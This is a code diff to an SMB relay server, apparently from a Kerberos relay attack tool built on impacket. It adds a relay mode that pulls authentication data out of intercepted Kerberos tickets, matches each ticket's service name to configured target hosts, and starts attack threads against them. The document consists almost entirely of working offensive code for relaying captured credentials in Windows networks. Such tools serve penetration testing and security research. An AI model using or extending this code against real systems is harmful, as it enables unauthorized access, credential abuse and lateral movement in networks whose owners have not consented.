@@ -39,7 +39,7 @@ from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.smbserver import getFileTime
 from pyasn1.codec.der import decoder, encoder
-from lib.utils.kerberos import get_kerberos_loot
+from lib.utils.kerberos import get_kerberos_loot, get_auth_data
 from lib.utils.spnego import GSSAPIHeader_SPNEGO_Init2, GSSAPIHeader_SPNEGO_Init, MechTypes, MechType, TypesMech, NegTokenResp, NegResult, NegotiationToken
 
 class SMBRelayServer(Thread):
@@ -217,14 +217,15 @@ class SMBRelayServer(Thread):
 
                         # This is Kerberos, we can do something with this
                         try:
-                            # If you're looking for the magic, it's in lib/utils/kerberos.py
-                            authdata = get_kerberos_loot(securityBlob, self.config)
-
-                            # If we are here, it was succesful
-
                             # Are we in attack mode? If so, launch attack against all targets
                             if self.config.mode == 'ATTACK':
+                                # If you're looking for the magic, it's in lib/utils/kerberos.py
+                                authdata = get_kerberos_loot(securityBlob, self.config)
                                 self.do_attack(authdata)
+
+                            if self.config.mode == 'RELAY':
+                                authdata = get_auth_data(securityBlob, self.config)
+                                self.do_relay(authdata)
 
                             # This ignores all signing stuff
                             # causes connection resets
@@ -565,6 +566,23 @@ class SMBRelayServer(Thread):
                 client_thread.start()
             else:
                 LOG.error('No attack configured for %s', parsed_target.scheme.upper())
+
+    def do_relay(self, authdata):
+        self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
+        sclass, host = authdata['service'].split('/')
+        for target in self.config.target.originalTargets:
+            parsed_target = target
+            if host.lower() in parsed_target.hostname.lower():
+                # Found a target with the same SPN
+                client = self.config.protocolClients[target.scheme.upper()](self.config, parsed_target)
+                client.initConnection(authdata, self.config.dcip)
+                # We have an attack.. go for it
+                attack = self.config.attacks[parsed_target.scheme.upper()]
+                client_thread = attack(self.config, client.session, self.authUser)
+                client_thread.start()
+                return
+        # Still here? Then no target was found matching this SPN
+        LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())
 
     def _start(self):
         self.server.daemon_threads=True
